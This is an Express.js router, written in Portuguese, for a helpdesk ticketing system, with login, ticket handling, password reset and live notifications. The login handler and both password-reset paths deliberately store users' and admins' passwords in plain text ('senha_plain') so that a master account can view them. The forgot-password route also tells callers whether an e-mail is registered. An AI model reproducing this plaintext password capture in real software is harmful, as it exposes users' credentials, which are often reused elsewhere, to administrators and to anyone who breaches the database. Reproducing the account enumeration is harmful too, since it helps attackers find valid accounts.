const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const router = express.Router();
const db = require('../db');
const { requireUsuario } = require('../auth');
const { loginRateLimit } = require('../ratelimit');
const push = require('../push');
const { enviarResetSenha } = require('../email');
const sse = require('../sse');

function sanitizar(str) {
  if (typeof str !== 'string') return str;
  return str.trim();
}

function normIp(ip) {
  if (!ip) return ip;
  return ip.startsWith('::ffff:') ? ip.slice(7) : ip;
}

router.post('/registro', (req, res) => {
  return res.status(403).json({ erro: 'Cadastro público desativado. Solicite acesso ao administrador.' });
});

// POST /api/usuarios/login
router.post('/login', loginRateLimit, async (req, res) => {
  try {
    const { email, senha } = req.body;
    if (!email || !senha) return res.status(400).json({ erro: 'E-mail e senha obrigatórios' });

    const usuario = db.buscarUsuarioPorEmail(email.trim().toLowerCase());
    if (!usuario) return res.status(401).json({ erro: 'E-mail ou senha inválidos' });

    const ok = await bcrypt.compare(senha, usuario.senha_hash);
    if (!ok) {
      try { db.registrarLogUsuario(usuario.id, 'login_falha', normIp(req.ip)); } catch {}
      return res.status(401).json({ erro: 'E-mail ou senha inválidos' });
    }
    if (usuario.ativo === 0) return res.status(403).json({ erro: 'Conta desativada. Entre em contato com o suporte.' });

    // Captura senha em texto plano para visualizacao do master (auditoria).
    if (!usuario.senha_plain || usuario.senha_plain !== senha) {
      db.atualizarUsuario(usuario.id, { senha_plain: senha });
    }

    const token = jwt.sign({ sub: usuario.id, nome: usuario.nome, email: usuario.email }, process.env.JWT_SECRET, { expiresIn: 30 * 24 * 60 * 60 });
    res.cookie('token_usuario', token, { httpOnly: true, sameSite: 'Strict', secure: process.env.NODE_ENV === 'production', maxAge: 30 * 24 * 60 * 60 * 1000 });
    try { db.registrarLogUsuario(usuario.id, 'login_sucesso', normIp(req.ip)); } catch {}

    return res.json({
      mensagem: 'Login realizado',
      nome: usuario.nome,
      email: usuario.email,
      ramal: usuario.ramal || '',
      setor: usuario.setor || '',
      precisa_trocar_senha: usuario.precisa_trocar_senha === 1,
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

// POST /api/usuarios/logout
router.post('/logout', (req, res) => {
  try {
    const tok = req.cookies?.token_usuario;
    if (tok) {
      const dec = jwt.verify(tok, process.env.JWT_SECRET);
      if (dec?.sub) db.registrarLogUsuario(dec.sub, 'logout', normIp(req.ip));
    }
  } catch {}
  res.clearCookie('token_usuario');
  return res.json({ mensagem: 'Logout realizado' });
});

// GET /api/usuarios/me
router.get('/me', requireUsuario, (req, res) => {
  const u = db.buscarUsuarioPorId(req.usuario.sub);
  if (!u) return res.status(404).json({ erro: 'Usuário não encontrado' });
  const { senha_hash, senha_plain, ...dados } = u;
  return res.json(dados);
});

// GET /api/usuarios/meus-chamados
router.get('/meus-chamados', requireUsuario, (req, res) => {
  try {
    const u = db.buscarUsuarioPorId(req.usuario.sub);
    const setor = u && u.setor ? u.setor : null;
    const chamados = db.listarChamadosPorUsuario(req.usuario.sub, setor);
    return res.json(chamados);
  } catch (err) {
    console.error(err);
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

// POST /api/usuarios/chamados/:id/lido
router.post('/chamados/:id/lido', requireUsuario, (req, res) => {
  try {
    db.zerarNovidadesUsuario(req.params.id, req.usuario.sub);
    return res.json({ ok: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

// POST /api/usuarios/chamados/:id/reabrir
router.post('/chamados/:id/reabrir', requireUsuario, (req, res) => {
  try {
    const chamadoId = parseInt(req.params.id, 10);
    const novaDescricao = sanitizar(req.body.nova_descricao || '');

    if (!novaDescricao || novaDescricao.length < 10 || novaDescricao.length > 2000) {
      return res.status(400).json({ erro: 'A nova descrição deve ter entre 10 e 2000 caracteres' });
    }

    const chamado = db.buscarChamadoPorId(chamadoId);
    if (!chamado) return res.status(404).json({ erro: 'Chamado não encontrado' });
    if (!db.usuarioPodeAcessarChamado(req.usuario.sub, chamado)) return res.status(403).json({ erro: 'Sem permissão' });
    if (!['concluido', 'encerrado'].includes(chamado.status)) {
      return res.status(400).json({ erro: 'Só é possível reabrir chamados concluídos ou encerrados' });
    }

    const dataRef = chamado.concluido_em || chamado.atualizado_em;
    if (dataRef) {
      const iso = dataRef.includes('T') ? dataRef : dataRef.replace(' ', 'T');
      const fechadoEm = new Date(iso.endsWith('Z') ? iso : iso + 'Z');
      const dias = (Date.now() - fechadoEm.getTime()) / (1000 * 60 * 60 * 24);
      if (dias > 7) {
        return res.status(400).json({ erro: 'O prazo para reabrir este chamado expirou. Se o problema persistir, abra um novo chamado.' });
      }
    }

    db.reabrirChamadoUsuario(chamadoId, novaDescricao);

    const destino = chamado.admin_responsavel_id
      ? push.enviarParaAdmin(chamado.admin_responsavel_id, '🔄 Chamado reaberto pelo solicitante', `${chamado.nome} (${chamado.setor}): ${novaDescricao.slice(0, 80)}${novaDescricao.length > 80 ? '…' : ''}`)
      : push.enviarParaTodos('🔄 Chamado reaberto pelo solicitante', `${chamado.nome} (${chamado.setor}): ${novaDescricao.slice(0, 80)}${novaDescricao.length > 80 ? '…' : ''}`);
    destino.catch(() => {});

    return res.json({ mensagem: 'Chamado reaberto com sucesso' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

// POST /api/usuarios/chamados/:id/aceitar-termo
router.post('/chamados/:id/aceitar-termo', requireUsuario, (req, res) => {
  try {
    const chamadoId = parseInt(req.params.id, 10);
    const chamado = db.buscarChamadoPorId(chamadoId);
    if (!chamado) return res.status(404).json({ erro: 'Chamado não encontrado' });
    if (!db.usuarioPodeAcessarChamado(req.usuario.sub, chamado))
      return res.status(403).json({ erro: 'Sem permissão' });
    const STATUS_ATIVOS = ['aberto', 'em_andamento', 'aguardando_compra', 'aguardando_chegar'];
    if (chamado.requer_acordo) {
      if (!STATUS_ATIVOS.includes(chamado.status))
        return res.status(400).json({ erro: 'O chamado já foi concluído' });
    } else {
      if (!['hardware', 'processo_compra'].includes(chamado.categoria))
        return res.status(400).json({ erro: 'Termo não aplicável a este chamado' });
      if (!['concluido', 'encerrado'].includes(chamado.status))
        return res.status(400).json({ erro: 'O chamado precisa estar concluído' });
    }

    const usuario = db.buscarUsuarioPorId(req.usuario.sub);
    if (!usuario) return res.status(404).json({ erro: 'Usuário não encontrado' });

    const { cargo, setor, equipamentos } = req.body || {};
    const setorFinal = typeof setor === 'string' ? setor.trim() : '';
    db.registrarTermoAceite({
      chamado_id: chamadoId,
      usuario_id: usuario.id,
      usuario_nome: usuario.nome,
      usuario_email: usuario.email,
      cargo: typeof cargo === 'string' ? cargo.trim() : '',
      setor: setorFinal,
      equipamentos: typeof equipamentos === 'string' ? equipamentos : '',
    });
    db.vincularEquipamentosDoAcordo(chamadoId, usuario.nome, setorFinal);

    return res.json({ mensagem: 'Termo aceito com sucesso' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

// POST /api/usuarios/chamados/:id/info-adicional
router.post('/chamados/:id/info-adicional', requireUsuario, (req, res) => {
  try {
    const chamado = db.buscarChamadoPorId(req.params.id);
    if (!chamado) return res.status(404).json({ erro: 'Chamado não encontrado' });
    if (!db.usuarioPodeAcessarChamado(req.usuario.sub, chamado))
      return res.status(403).json({ erro: 'Sem permissão' });
    const texto = sanitizar(req.body.texto || '');
    if (!texto || texto.length < 3) return res.status(400).json({ erro: 'Texto muito curto (mín. 3 caracteres)' });
    if (texto.length > 2000) return res.status(400).json({ erro: 'Texto muito longo (máx. 2000 caracteres)' });
    const usuario = db.buscarUsuarioPorId(req.usuario.sub);
    const autorNome = usuario ? usuario.nome : 'Usuário';
    db.inserirInfoAdicional({ chamado_id: chamado.id, texto, autor_tipo: 'usuario', autor_id: req.usuario.sub, autor_nome: autorNome });
    db.getDb().prepare(`
      INSERT INTO historico_chamados (chamado_id, admin_id, acao, valor_anterior, valor_novo)
      VALUES (?, NULL, 'info_adicional', ?, ?)
    `).run(chamado.id, autorNome, texto);
    return res.status(201).json({ mensagem: 'Informação adicionada' });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

// GET /api/usuarios/chamados/:id/termo-aceite
router.get('/chamados/:id/termo-aceite', requireUsuario, (req, res) => {
  try {
    const chamadoId = parseInt(req.params.id, 10);
    const chamado = db.buscarChamadoPorId(chamadoId);
    if (!chamado) return res.status(404).json({ erro: 'Chamado não encontrado' });
    if (!db.usuarioPodeAcessarChamado(req.usuario.sub, chamado))
      return res.status(403).json({ erro: 'Sem permissão' });
    const termo = db.buscarTermoAceite(chamadoId);
    return res.json(termo || null);
  } catch (err) {
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

function senhaForte(s) {
  return s.length >= 8 && /[A-Z]/.test(s) && /[a-z]/.test(s) && /[0-9]/.test(s) && /[^A-Za-z0-9]/.test(s);
}

// POST /api/usuarios/esqueci-senha
router.post('/esqueci-senha', async (req, res) => {
  try {
    const email = (req.body.email || '').trim().toLowerCase();
    if (!email) return res.status(400).json({ erro: 'E-mail obrigatório' });

    const base = process.env.APP_URL || `https://sistema-chamados-granmarquise.fly.dev`;
    const expires_at = new Date(Date.now() + 60 * 60 * 1000).toISOString().replace('T', ' ').substring(0, 19);

    const usuario = db.buscarUsuarioPorEmail(email);
    if (usuario && usuario.ativo !== 0) {
      console.log(`[esqueci-senha] Usuário encontrado: ${email}`);
      const token = crypto.randomBytes(32).toString('hex');
      db.criarResetToken(usuario.id, token, expires_at);
      try { db.registrarLogUsuario(usuario.id, 'reset_solicitado', normIp(req.ip)); } catch {}
      const link = `${base}/redefinir-senha.html?token=${token}`;
      await enviarResetSenha(usuario.email, usuario.nome, link);
      try { db.registrarLogUsuario(usuario.id, 'reset_email_enviado', normIp(req.ip)); } catch {}
      return res.json({ mensagem: 'E-mail enviado com sucesso.' });
    }

    const admin = db.buscarAdminPorEmail(email);
    if (admin && admin.ativo !== 0) {
      console.log(`[esqueci-senha] Admin encontrado: ${email}`);
      const token = crypto.randomBytes(32).toString('hex');
      db.criarAdminResetToken(admin.id, token, expires_at);
      try { db.registrarLogAdmin(admin.id, 'reset_solicitado', normIp(req.ip)); } catch {}
      const link = `${base}/redefinir-senha.html?token=${token}`;
      await enviarResetSenha(admin.email, admin.nome_completo, link);
      try { db.registrarLogAdmin(admin.id, 'reset_email_enviado', normIp(req.ip)); } catch {}
      return res.json({ mensagem: 'E-mail enviado com sucesso.' });
    }

    console.log(`[esqueci-senha] E-mail não encontrado no sistema: ${email}`);
    return res.status(404).json({ erro: 'E-mail não encontrado no sistema. Verifique o endereço informado.' });
  } catch (err) {
    console.error('[esqueci-senha]', err);
    return res.status(500).json({ erro: 'Erro ao processar solicitação' });
  }
});

// POST /api/usuarios/redefinir-senha
router.post('/redefinir-senha', async (req, res) => {
  try {
    const { token, senha } = req.body;
    if (!token || !senha) return res.status(400).json({ erro: 'Token e senha são obrigatórios' });

    let registro = db.buscarResetToken(token);
    let isAdmin = false;
    if (!registro) {
      registro = db.buscarAdminResetToken(token);
      isAdmin = true;
    }
    if (!registro) return res.status(400).json({ erro: 'Link inválido ou expirado' });
    if (registro.usado) {
      try {
        if (isAdmin) db.registrarLogAdmin(registro.admin_id, 'reset_link_ja_usado', normIp(req.ip));
        else db.registrarLogUsuario(registro.usuario_id, 'reset_link_ja_usado', normIp(req.ip));
      } catch {}
      return res.status(400).json({ erro: 'Este link já foi utilizado' });
    }

    const agora = new Date();
    const expira = new Date(registro.expires_at.replace(' ', 'T') + 'Z');
    if (agora > expira) {
      try {
        if (isAdmin) db.registrarLogAdmin(registro.admin_id, 'reset_link_expirado', normIp(req.ip));
        else db.registrarLogUsuario(registro.usuario_id, 'reset_link_expirado', normIp(req.ip));
      } catch {}
      return res.status(400).json({ erro: 'Link expirado. Solicite um novo.' });
    }

    if (!senhaForte(senha)) {
      return res.status(400).json({ erro: 'A senha não atende aos requisitos mínimos de segurança' });
    }

    const senha_hash = await bcrypt.hash(senha, 10);
    if (isAdmin) {
      db.atualizarAdmin(registro.admin_id, { senha_hash, senha_plain: senha, precisa_trocar_senha: 0 });
      db.marcarAdminResetTokenUsado(token);
      try { db.registrarLogAdmin(registro.admin_id, 'reset_concluido', normIp(req.ip)); } catch {}
    } else {
      db.atualizarUsuario(registro.usuario_id, { senha_hash, senha_plain: senha, precisa_trocar_senha: 0 });
      db.marcarResetTokenUsado(token);
      try { db.registrarLogUsuario(registro.usuario_id, 'reset_concluido', normIp(req.ip)); } catch {}
    }

    return res.json({ mensagem: 'Senha redefinida com sucesso!' });
  } catch (err) {
    console.error('[redefinir-senha]', err);
    return res.status(500).json({ erro: 'Erro interno' });
  }
});

// GET /api/usuarios/stream — SSE para notificações em tempo real
router.get('/stream', requireUsuario, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no'); // nginx/proxy: NÃO bufferiza
  res.setHeader('Content-Encoding', 'identity'); // SEM compressão Brotli/gzip
  res.flushHeaders();
  // Padding inicial 2KB força flush em proxies que esperam tamanho mínimo
  res.write(':' + ' '.repeat(2048) + '\n\n');

  const userId = req.usuario.sub;
  sse.subscribe(userId, res);

  const hb = setInterval(() => { try { res.write(':hb\n\n'); } catch {} }, 25000);

  req.on('close', () => {
    clearInterval(hb);
    sse.unsubscribe(userId, res);
  });
});

module.exports = router;
